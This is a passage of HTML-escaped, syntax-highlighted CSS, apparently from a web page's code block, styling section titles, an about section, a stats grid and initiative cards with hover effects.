&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            content: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            position: absolute&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            bottom: -10px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            left: 50%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transform: translateX&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-50%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 90px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly wider underline */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: 5px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Thicker underline */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-radius: 3px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .section-title p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--text&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            max-width: 700px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; auto&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.1rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .about-content &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: grid&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            grid-template-columns: 1fr 1fr&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            gap: 3rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            align-items: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .about-img &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-radius: 12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More rounded */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            overflow: hidden&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 12px 25px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Enhanced shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .about-img img &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 100%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: auto&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: block&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: transform 0.5s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .about-img:hover img &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transform: scale&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.08&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More pronounced zoom */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .about-text h3 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--dark&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .about-text p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.05rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .stats &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: grid&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            grid-template-columns: repeat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4, 1fr&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            gap: 2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-top: 4rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More space */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .stat-item &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-align: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 2.5rem 1.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More padding */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-radius: 12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More rounded */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 8px 20px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.08&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Enhanced shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: transform 0.3s ease, box-shadow 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .stat-item:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transform: translateY&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-12px&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More pronounced lift */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 15px 30px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Stronger hover shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .stat-item h3 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 3rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Larger numbers */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--dark&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 0.8rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .stat-item p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--text&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.1rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiatives &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiatives-grid &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: grid&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            grid-template-columns: repeat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3, 1fr&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            gap: 2.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-card &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--light&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-radius: 12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More rounded */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            overflow: hidden&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 8px 20px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.08&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Enhanced shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: transform 0.3s ease, box-shadow 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-card:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transform: translateY&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-12px&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More pronounced lift */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 15px 30px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Stronger hover shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-img &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: 220px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly taller images */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            overflow: hidden&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-img img &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 100%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: 100%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            object-fit: cover&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: transform 0.5s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-card:hover .initiative-img img &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transform: scale&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More pronounced zoom */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-content &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-content h3 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.6rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--dark&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .initiative-content p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1.8rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.05rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .cta &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
